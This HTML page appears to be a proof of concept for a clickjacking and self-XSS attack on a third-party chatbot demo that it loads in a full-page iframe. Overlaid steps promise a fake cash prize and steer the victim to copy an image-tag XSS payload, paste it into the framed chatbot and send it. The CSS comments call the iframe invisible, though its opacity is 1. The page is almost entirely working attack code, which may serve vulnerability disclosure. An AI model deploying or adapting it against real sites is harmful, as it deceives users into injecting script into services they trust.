<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
html, body {
  margin: 0;
  width: 100%;
  height: 100%;
  overflow: hidden;
}

/* FULL-PAGE IFRAME (INVISIBLE BUT CLICKABLE) */
iframe {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  border: 0;
  opacity: 1;           /* invisible */
  pointer-events: auto; /* still clickable */
}

/* NON-BLOCKING INSTRUCTION TAG */
#hint {
  position: fixed;
  top: 70px;
  right: 0px;
  background: #000;
  color: #fff;
  padding: 6px 10px;
  font-size: 13px;
  border-radius: 6px;
  pointer-events: none; /* does NOT block chatbot */
  white-space: nowrap;
}

#paste {
  position: fixed;
  top: 93%;
  right: 200px;
  background: #000;
  color: #fff;
  padding: 6px 10px;
  font-size: 13px;
  border-radius: 6px;
  pointer-events: none; /* does NOT block chatbot */
  white-space: nowrap;
}

/* COPY BUTTON */
#copyBtn {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  padding: 10px 20px;
  font-size: 16px;
  cursor: pointer;
  z-index: 10; /* make sure it’s above iframe */
}
#send{
   position: fixed;
  top: 93%;
  right: 15px;
  background: #000;
  color: #fff;
  padding: 6px 10px;
  font-size: 13px;
  border-radius: 6px;
  pointer-events: none; /* does NOT block chatbot */
  white-space: nowrap;
}
</style>
</head>
<body>

<iframe src="https://sls.aliyun.com/doc/en/playground/cmsdemo.html"></iframe>
<h1>follow the steps step by step to win 1000000$</h1>
<div id="hint">2.Click here</div>
<div id="paste">3.Paste here</div>

<button id="copyBtn">1.Copy Text to win 10000000000000$</button>
<div id="send">4.Send</div>

<script>
  const button = document.getElementById('copyBtn');

  button.addEventListener('click', () => {
    const textToCopy = '<img src=x onerror=alert(document.domain)>';
    navigator.clipboard.writeText(textToCopy)
  });
</script>

</body>
</html>
